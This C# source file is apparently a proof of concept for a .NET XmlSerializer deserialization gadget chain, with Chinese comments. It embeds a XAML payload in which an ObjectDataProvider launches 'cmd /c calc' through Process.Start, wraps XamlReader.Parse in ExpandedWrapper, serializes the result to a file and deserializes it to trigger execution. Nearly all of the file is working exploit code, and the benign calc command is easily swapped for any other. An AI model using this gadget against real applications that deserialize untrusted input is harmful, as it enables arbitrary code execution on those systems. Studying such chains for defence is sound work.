using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Xml.Serialization;
using System.Data.Services.Internal;
using System.Windows.Data;
using System.Windows.Markup;
using System.Windows;

namespace Deserialize
{

    class Program
    {
        static String payloadXml=
@"<ResourceDictionary  xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml"" xmlns:System=""clr-namespace:System;assembly=mscorlib"" xmlns:sd=""clr-namespace:System.Diagnostics;assembly=System"" >
    <ObjectDataProvider ObjectType = ""{x:Type sd:Process}"" MethodName=""Start"" x:Key=""powershell"">
        <ObjectDataProvider.MethodParameters>
            <System:String>cmd</System:String>
            <System:String>/c calc</System:String>
        </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>
</ResourceDictionary>";

        //生成一个不完整的resourceDictionary xaml 文件
        // 不完整是由于 XmlWrite.Save 的限制，我们可以在其基础上进行更改
        public static void CreateXamlResource()
        {
            var resource = new ResourceDictionary();
            var obj = new ObjectDataProvider();
            obj.ObjectType = typeof(System.Diagnostics.Process);
            obj.MethodParameters.Add("cmd");
            obj.MethodParameters.Add("/c calc");
            obj.MethodName = "Start";
            resource.Add("powershell", obj);
            var xamlString = XamlWriter.Save(resource);

            using (TextWriter fo = new StreamWriter("./xaml.xml"))
            {
                fo.Write(xamlString);
                fo.Close();
            }
        }

        // 测试XamlReader 的Parse 函数，能否根据ResourceDirectory 文件里的设置启动calc
        public static void testXaml()
        {
            XamlReader theXaml = new XamlReader(); 
            var test = XamlReader.Parse(payloadXml);
        }

        //  XamlReader + ObjectDataProvider + ExpandedWrapper 序列化， 生成paylaod
        public static void serializeObjectWithXmlSer()
        {

            ExpandedWrapper<XamlReader, ObjectDataProvider> wrapper = new ExpandedWrapper<XamlReader, ObjectDataProvider>();
            wrapper.ProjectedProperty0 = new ObjectDataProvider();
            wrapper.ProjectedProperty0.ObjectInstance = new XamlReader();
            //wrapper.ProjectedProperty0.ObjectType = typeof(TestClass);
            wrapper.ProjectedProperty0.MethodName = "Parse";
            wrapper.ProjectedProperty0.MethodParameters.Add(payloadXml);

            XmlSerializer serializer = new XmlSerializer(typeof(ExpandedWrapper<XamlReader, ObjectDataProvider>));
            TextWriter fo = new StreamWriter("./xmlser.txt");
            serializer.Serialize(fo, wrapper);
            fo.Close();
        }

        // 从xml文件反序列化
        public static void DeserializerFromXml()
        {
            using (var stream = new FileStream("./xmlser.txt", FileMode.Open))
            {
                Type targetType  = typeof(ExpandedWrapper<XamlReader, ObjectDataProvider>);
                String targetTypeName = targetType.AssemblyQualifiedName;
                Console.WriteLine(targetTypeName);
                var serializers = new XmlSerializer(Type.GetType(targetTypeName));
                serializers.Deserialize(stream);
            }
        }

        static void Main(string[] args)
        {
            //serializeObjectWithXmlSer();
            //testXamlReader();
            //testXaml();
            serializeObjectWithXmlSer();
            DeserializerFromXml();
        }
    }
}
